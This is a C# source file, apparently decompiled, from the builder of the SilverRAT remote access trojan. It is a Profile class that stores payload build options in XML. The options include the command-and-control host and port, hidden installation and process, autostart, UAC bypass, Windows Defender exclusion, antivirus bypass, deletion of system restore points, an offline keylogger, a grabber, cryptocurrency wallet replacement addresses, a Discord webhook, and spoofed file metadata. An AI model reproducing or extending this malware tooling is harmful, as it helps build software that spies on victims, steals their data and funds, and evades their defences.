using System;
using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Xml.XPath;

namespace SilverRAT.Helper;

internal class Profile
{
    private readonly string _profilePath;

    public string UsernameLogin
    {
        get
        {
            return ReadValueSafe("UsernameLogin");
        }
        set
        {
            WriteValue("UsernameLogin", value);
        }
    }

    public string PasswordLogin
    {
        get
        {
            return ReadValueSafe("PasswordLogin");
        }
        set
        {
            WriteValue("PasswordLogin", value);
        }
    }

    public string SocketPort
    {
        get
        {
            return ReadValueSafe("SocketPort");
        }
        set
        {
            WriteValue("SocketPort", value);
        }
    }

    public string TextTitleNotif
    {
        get
        {
            return ReadValueSafe("TextTitleNotif", "Notification Title");
        }
        set
        {
            WriteValue("TextTitleNotif", value);
        }
    }

    public string TextMessageNotif
    {
        get
        {
            return ReadValueSafe("TextMessageNotif", "This is the notification text!");
        }
        set
        {
            WriteValue("TextMessageNotif", value);
        }
    }

    public string TextDelayNotif
    {
        get
        {
            return ReadValueSafe("TextDelayNotif", "2000");
        }
        set
        {
            WriteValue("TextDelayNotif", value);
        }
    }

    public string SpeedNotif
    {
        get
        {
            return ReadValueSafe("SpeedNotif", "500");
        }
        set
        {
            WriteValue("SpeedNotif", value);
        }
    }

    public bool ShowIconNotif
    {
        get
        {
            return bool.Parse(ReadValueSafe("ShowIconNotif", "True"));
        }
        set
        {
            WriteValue("ShowIconNotif", value.ToString());
        }
    }

    public bool ShowCloseButtNotif
    {
        get
        {
            return bool.Parse(ReadValueSafe("ShowCloseButtNotif", "True"));
        }
        set
        {
            WriteValue("ShowCloseButtNotif", value.ToString());
        }
    }

    public bool ScrollToOutNotif
    {
        get
        {
            return bool.Parse(ReadValueSafe("ScrollToOutNotif", "True"));
        }
        set
        {
            WriteValue("ScrollToOutNotif", value.ToString());
        }
    }

    public bool EffectNotif
    {
        get
        {
            return bool.Parse(ReadValueSafe("EffectNotif", "True"));
        }
        set
        {
            WriteValue("EffectNotif", value.ToString());
        }
    }

    public int CurvatureForm
    {
        get
        {
            return int.Parse(ReadValueSafe("CurvatureForm", "40"));
        }
        set
        {
            WriteValue("CurvatureForm", value.ToString());
        }
    }

    public int DownColorForm
    {
        get
        {
            return int.Parse(ReadValueSafe("DownColorForm", "0"));
        }
        set
        {
            WriteValue("DownColorForm", value.ToString());
        }
    }

    public string ThemeListClient
    {
        get
        {
            return ReadValueSafe("ThemeListClient", "0");
        }
        set
        {
            WriteValue("ThemeListClient", value);
        }
    }

    public bool EnableLogo
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableLogo", "True"));
        }
        set
        {
            WriteValue("EnableLogo", value.ToString());
        }
    }

    public bool EnableID
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableID", "False"));
        }
        set
        {
            WriteValue("EnableID", value.ToString());
        }
    }

    public bool EnableIP
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableIP", "True"));
        }
        set
        {
            WriteValue("EnableIP", value.ToString());
        }
    }

    public bool EnableFlag
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableFlag", "True"));
        }
        set
        {
            WriteValue("EnableFlag", value.ToString());
        }
    }

    public bool EnableCountry
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableCountry", "True"));
        }
        set
        {
            WriteValue("EnableCountry", value.ToString());
        }
    }

    public bool EnableUsername
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableUsername", "True"));
        }
        set
        {
            WriteValue("EnableUsername", value.ToString());
        }
    }

    public bool EnableVersion
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableVersion", "True"));
        }
        set
        {
            WriteValue("EnableVersion", value.ToString());
        }
    }

    public bool EnableMonitor
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableMonitor", "False"));
        }
        set
        {
            WriteValue("EnableMonitor", value.ToString());
        }
    }

    public string PageL
    {
        get
        {
            return ReadValueSafe("PageL", "4");
        }
        set
        {
            WriteValue("PageL", value);
        }
    }

    public string PageO
    {
        get
        {
            return ReadValueSafe("PageO", "4");
        }
        set
        {
            WriteValue("PageO", value);
        }
    }

    public string PageSpeed
    {
        get
        {
            return ReadValueSafe("PageSpeed", "3");
        }
        set
        {
            WriteValue("PageSpeed", value);
        }
    }

    public bool EnableEdgecurvature
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableEdgecurvature", "True"));
        }
        set
        {
            WriteValue("EnableEdgecurvature", value.ToString());
        }
    }

    public string String_0
    {
        get
        {
            return ReadValueSafe("URLDiscord");
        }
        set
        {
            WriteValue("URLDiscord", value);
        }
    }

    public bool EnableDiscord
    {
        get
        {
            return bool.Parse(ReadValueSafe("EnableDiscord", "False"));
        }
        set
        {
            WriteValue("EnableDiscord", value.ToString());
        }
    }

    public string Group
    {
        get
        {
            return ReadValueSafe("Group");
        }
        set
        {
            WriteValue("Group", value);
        }
    }

    public string DataEncryptionKey
    {
        get
        {
            return ReadValueSafe("DataEncryptionKey", Methods.GetRandomString(30));
        }
        set
        {
            WriteValue("DataEncryptionKey", value);
        }
    }

    public bool Boolean_0
    {
        get
        {
            return bool.Parse(ReadValueSafe("NormalDNS", "True"));
        }
        set
        {
            WriteValue("NormalDNS", value.ToString());
        }
    }

    public bool Pastebin
    {
        get
        {
            return bool.Parse(ReadValueSafe("Pastebin", "False"));
        }
        set
        {
            WriteValue("Pastebin", value.ToString());
        }
    }

    public string Host
    {
        get
        {
            return ReadValueSafe("Host", Methods.GetLocalIPAddress());
        }
        set
        {
            WriteValue("Host", value);
        }
    }

    public string Port
    {
        get
        {
            return ReadValueSafe("Port", "7777");
        }
        set
        {
            WriteValue("Port", value);
        }
    }

    public string ProcessMetux
    {
        get
        {
            return ReadValueSafe("ProcessMetux", Methods.GetRandomString(10));
        }
        set
        {
            WriteValue("ProcessMetux", value);
        }
    }

    public bool Installation
    {
        get
        {
            return bool.Parse(ReadValueSafe("Installation", "False"));
        }
        set
        {
            WriteValue("Installation", value.ToString());
        }
    }

    public string Processname
    {
        get
        {
            return ReadValueSafe("Processname");
        }
        set
        {
            WriteValue("Processname", value);
        }
    }

    public string Foldername
    {
        get
        {
            return ReadValueSafe("Foldername");
        }
        set
        {
            WriteValue("Foldername", value);
        }
    }

    public bool AutoStartup
    {
        get
        {
            return bool.Parse(ReadValueSafe("AutoStartup", "False"));
        }
        set
        {
            WriteValue("AutoStartup", value.ToString());
        }
    }

    public bool ProgramData
    {
        get
        {
            return bool.Parse(ReadValueSafe("ProgramData", "True"));
        }
        set
        {
            WriteValue("ProgramData", value.ToString());
        }
    }

    public bool ProgramFiles
    {
        get
        {
            return bool.Parse(ReadValueSafe("ProgramFiles", "False"));
        }
        set
        {
            WriteValue("ProgramFiles", value.ToString());
        }
    }

    public bool AppData
    {
        get
        {
            return bool.Parse(ReadValueSafe("AppData", "False"));
        }
        set
        {
            WriteValue("AppData", value.ToString());
        }
    }

    public bool HiddenInstall
    {
        get
        {
            return bool.Parse(ReadValueSafe("HiddenInstall", "False"));
        }
        set
        {
            WriteValue("HiddenInstall", value.ToString());
        }
    }

    public bool BlockAccessPath
    {
        get
        {
            return bool.Parse(ReadValueSafe("BlockAccessPath", "False"));
        }
        set
        {
            WriteValue("BlockAccessPath", value.ToString());
        }
    }

    public bool DeleteSystemRestorePoints
    {
        get
        {
            return bool.Parse(ReadValueSafe("DeleteSystemRestorePoints", "False"));
        }
        set
        {
            WriteValue("DeleteSystemRestorePoints", value.ToString());
        }
    }

    public bool Discord
    {
        get
        {
            return bool.Parse(ReadValueSafe("Discord", "False"));
        }
        set
        {
            WriteValue("Discord", value.ToString());
        }
    }

    public string WebHook
    {
        get
        {
            return ReadValueSafe("WebHook");
        }
        set
        {
            WriteValue("WebHook", value);
        }
    }

    public bool Boolean_1
    {
        get
        {
            return bool.Parse(ReadValueSafe("BypassUAC", "False"));
        }
        set
        {
            WriteValue("BypassUAC", value.ToString());
        }
    }

    public bool DefeindrExclustion
    {
        get
        {
            return bool.Parse(ReadValueSafe("DefeindrExclustion", "False"));
        }
        set
        {
            WriteValue("DefeindrExclustion", value.ToString());
        }
    }

    public bool HiddenProcess
    {
        get
        {
            return bool.Parse(ReadValueSafe("HiddenProcess", "False"));
        }
        set
        {
            WriteValue("HiddenProcess", value.ToString());
        }
    }

    public bool BuilderCreateTask
    {
        get
        {
            return bool.Parse(ReadValueSafe("BuilderCreateTask", "False"));
        }
        set
        {
            WriteValue("BuilderCreateTask", value.ToString());
        }
    }

    public int BuilderRunTask
    {
        get
        {
            return int.Parse(ReadValueSafe("BuilderRunTask", "1"));
        }
        set
        {
            WriteValue("BuilderRunTask", value.ToString());
        }
    }

    public bool Delay
    {
        get
        {
            return bool.Parse(ReadValueSafe("Delay", "False"));
        }
        set
        {
            WriteValue("Delay", value.ToString());
        }
    }

    public string NumDelay
    {
        get
        {
            return ReadValueSafe("NumDelay", "3".ToString());
        }
        set
        {
            WriteValue("NumDelay", value.ToString());
        }
    }

    public bool ReconnectionDelay
    {
        get
        {
            return bool.Parse(ReadValueSafe("ReconnectionDelay", "False"));
        }
        set
        {
            WriteValue("ReconnectionDelay", value.ToString());
        }
    }

    public string String_1
    {
        get
        {
            return ReadValueSafe("NUMReconnectionDelay", "4");
        }
        set
        {
            WriteValue("NUMReconnectionDelay", value);
        }
    }

    public bool SaveSettings
    {
        get
        {
            return bool.Parse(ReadValueSafe("SaveSettings", "True"));
        }
        set
        {
            WriteValue("SaveSettings", value.ToString());
        }
    }

    public bool KeyloaggarOfflien
    {
        get
        {
            return bool.Parse(ReadValueSafe("KeyloaggarOfflien", "False"));
        }
        set
        {
            WriteValue("KeyloaggarOfflien", value.ToString());
        }
    }

    public string IconPath
    {
        get
        {
            return ReadValueSafe("IconPath");
        }
        set
        {
            WriteValue("IconPath", value);
        }
    }

    public bool BypassAV
    {
        get
        {
            return bool.Parse(ReadValueSafe("BypassAV", "False"));
        }
        set
        {
            WriteValue("BypassAV", value.ToString());
        }
    }

    public string KeyAV
    {
        get
        {
            return ReadValueSafe("KeyAV");
        }
        set
        {
            WriteValue("KeyAV", value);
        }
    }

    public string PayloadName
    {
        get
        {
            return ReadValueSafe("PayloadName", "SilverClient");
        }
        set
        {
            WriteValue("PayloadName", value);
        }
    }

    public bool AssemblyInformation
    {
        get
        {
            return bool.Parse(ReadValueSafe("AssemblyInformation", "False"));
        }
        set
        {
            WriteValue("AssemblyInformation", value.ToString());
        }
    }

    public string Title
    {
        get
        {
            return ReadValueSafe("Title");
        }
        set
        {
            WriteValue("Title", value);
        }
    }

    public string Description
    {
        get
        {
            return ReadValueSafe("Description");
        }
        set
        {
            WriteValue("Description", value);
        }
    }

    public string Copyright
    {
        get
        {
            return ReadValueSafe("Copyright");
        }
        set
        {
            WriteValue("Copyright", value);
        }
    }

    public string Company
    {
        get
        {
            return ReadValueSafe("Company");
        }
        set
        {
            WriteValue("Company", value);
        }
    }

    public string Trademarks
    {
        get
        {
            return ReadValueSafe("Trademarks");
        }
        set
        {
            WriteValue("Trademarks", value);
        }
    }

    public bool Datemodified
    {
        get
        {
            return bool.Parse(ReadValueSafe("Datemodified", "False"));
        }
        set
        {
            WriteValue("Datemodified", value.ToString());
        }
    }

    public DateTime DatemodifiedValue
    {
        get
        {
            return DateTime.Parse(ReadValueSafe("DatemodifiedValue", "8/27/2022 8:14 PM"));
        }
        set
        {
            WriteValue("DatemodifiedValue", value.ToString());
        }
    }

    public bool Icon
    {
        get
        {
            return bool.Parse(ReadValueSafe("Icon", "False"));
        }
        set
        {
            WriteValue("Icon", value.ToString());
        }
    }

    public string VR1
    {
        get
        {
            return ReadValueSafe("VR1", "1");
        }
        set
        {
            WriteValue("VR1", value);
        }
    }

    public string VR2
    {
        get
        {
            return ReadValueSafe("VR2", "0");
        }
        set
        {
            WriteValue("VR1", value);
        }
    }

    public string VR3
    {
        get
        {
            return ReadValueSafe("VR3", "0");
        }
        set
        {
            WriteValue("VR3", value);
        }
    }

    public string VR4
    {
        get
        {
            return ReadValueSafe("VR4", "0");
        }
        set
        {
            WriteValue("VR4", value);
        }
    }

    public bool Exe
    {
        get
        {
            return bool.Parse(ReadValueSafe("exe", "True"));
        }
        set
        {
            WriteValue("exe", value.ToString());
        }
    }

    public bool Com
    {
        get
        {
            return bool.Parse(ReadValueSafe("com", "False"));
        }
        set
        {
            WriteValue("com", value.ToString());
        }
    }

    public bool Cmd
    {
        get
        {
            return bool.Parse(ReadValueSafe("cmd", "False"));
        }
        set
        {
            WriteValue("cmd", value.ToString());
        }
    }

    public bool pif
    {
        get
        {
            return bool.Parse(ReadValueSafe("pif", "False"));
        }
        set
        {
            WriteValue("pif", value.ToString());
        }
    }

    public bool Scr
    {
        get
        {
            return bool.Parse(ReadValueSafe("scr", "False"));
        }
        set
        {
            WriteValue("scr", value.ToString());
        }
    }

    public bool Grabber
    {
        get
        {
            return bool.Parse(ReadValueSafe("Grabber", "False"));
        }
        set
        {
            WriteValue("Grabber", value.ToString());
        }
    }

    public string BTC
    {
        get
        {
            return ReadValueSafe("BTC");
        }
        set
        {
            WriteValue("BTC", value);
        }
    }

    public string ETH
    {
        get
        {
            return ReadValueSafe("ETH");
        }
        set
        {
            WriteValue("ETH", value);
        }
    }

    public string XMR
    {
        get
        {
            return ReadValueSafe("XMR");
        }
        set
        {
            WriteValue("XMR", value);
        }
    }

    public bool ScanWindowsActive
    {
        get
        {
            return bool.Parse(ReadValueSafe("ScanWindowsActive", "False"));
        }
        set
        {
            WriteValue("ScanWindowsActive", value.ToString());
        }
    }

    public string ListWindowsActive
    {
        get
        {
            return ReadValueSafe("ListWindowsActive");
        }
        set
        {
            WriteValue("ListWindowsActive", value);
        }
    }

    public Profile(string profileName)
    {
        if (string.IsNullOrEmpty(profileName))
        {
            throw new ArgumentException("Invalid Profile Path");
        }
        _profilePath = Path.Combine(Application.StartupPath, "Profiles\\" + profileName + ".xml");
    }

    private string ReadValue(string pstrValueToRead)
    {
        try
        {
            XPathDocument xPathDocument = new XPathDocument(_profilePath);
            XPathNavigator xPathNavigator = xPathDocument.CreateNavigator();
            XPathExpression expr = xPathNavigator.Compile("/settings/" + pstrValueToRead);
            XPathNodeIterator xPathNodeIterator = xPathNavigator.Select(expr);
            if (xPathNodeIterator.MoveNext())
            {
                return xPathNodeIterator.Current.Value;
            }
            return string.Empty;
        }
        catch
        {
            return string.Empty;
        }
    }

    private string ReadValueSafe(string pstrValueToRead, string defaultValue = "")
    {
        string text = ReadValue(pstrValueToRead);
        return (!string.IsNullOrEmpty(text)) ? text : defaultValue;
    }

    private void WriteValue(string pstrValueToRead, string pstrValueToWrite)
    {
        try
        {
            XmlDocument xmlDocument = new XmlDocument();
            if (File.Exists(_profilePath))
            {
                using XmlTextReader reader = new XmlTextReader(_profilePath);
                xmlDocument.Load(reader);
            }
            else
            {
                string directoryName = Path.GetDirectoryName(_profilePath);
                if (!Directory.Exists(directoryName))
                {
                    Directory.CreateDirectory(directoryName);
                }
                xmlDocument.AppendChild(xmlDocument.CreateElement("settings"));
            }
            XmlElement documentElement = xmlDocument.DocumentElement;
            XmlNode xmlNode = documentElement.SelectSingleNode("/settings/" + pstrValueToRead);
            if (xmlNode == null)
            {
                xmlNode = xmlDocument.SelectSingleNode("settings");
                xmlNode.AppendChild(xmlDocument.CreateElement(pstrValueToRead)).InnerText = pstrValueToWrite;
                xmlDocument.Save(_profilePath);
            }
            else
            {
                xmlNode.InnerText = pstrValueToWrite;
                xmlDocument.Save(_profilePath);
            }
        }
        catch
        {
        }
    }
}
